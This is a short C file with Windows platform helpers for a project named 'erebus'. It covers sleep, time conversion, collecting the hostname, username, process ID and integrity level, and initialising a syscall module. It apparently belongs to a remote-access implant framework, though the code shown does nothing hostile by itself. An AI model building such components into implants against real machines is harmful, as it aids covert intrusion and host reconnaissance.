#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string.h>

#include "erebus/platform.h"
#include "erebus/syscall.h"

void erebus_sleep_ms(uint32_t ms) {
    Sleep(ms);
}

int64_t erebus_unix_ms(void) {
    FILETIME ft;
    ULARGE_INTEGER u;
    GetSystemTimeAsFileTime(&ft);
    u.LowPart = ft.dwLowDateTime;
    u.HighPart = ft.dwHighDateTime;
    /* FILETIME is 100ns since 1601-01-01; convert to Unix ms. */
    return (int64_t)((u.QuadPart - 116444736000000000ULL) / 10000ULL);
}

void erebus_get_identity(char *hostname, size_t hcap, char *username, size_t ucap,
    uint32_t *pid, char *integrity, size_t icap) {
    if (hostname && hcap) {
        DWORD sz = (DWORD)hcap;
        GetComputerNameA(hostname, &sz);
    }
    if (username && ucap) {
        DWORD sz = (DWORD)ucap;
        GetUserNameA(username, &sz);
    }
    if (pid) *pid = GetCurrentProcessId();
    if (integrity && icap) {
        strncpy(integrity, "medium", icap - 1);
        integrity[icap - 1] = '\0';
    }
}

const char *erebus_os_name(void) { return "windows"; }

const char *erebus_arch_name(void) {
#if defined(_M_X64) || defined(__x86_64__)
    return "amd64";
#elif defined(_M_ARM64)
    return "arm64";
#else
    return "unknown";
#endif
}

int erebus_platform_init(void) {
    return erebus_syscall_init() ? 1 : 0;
}
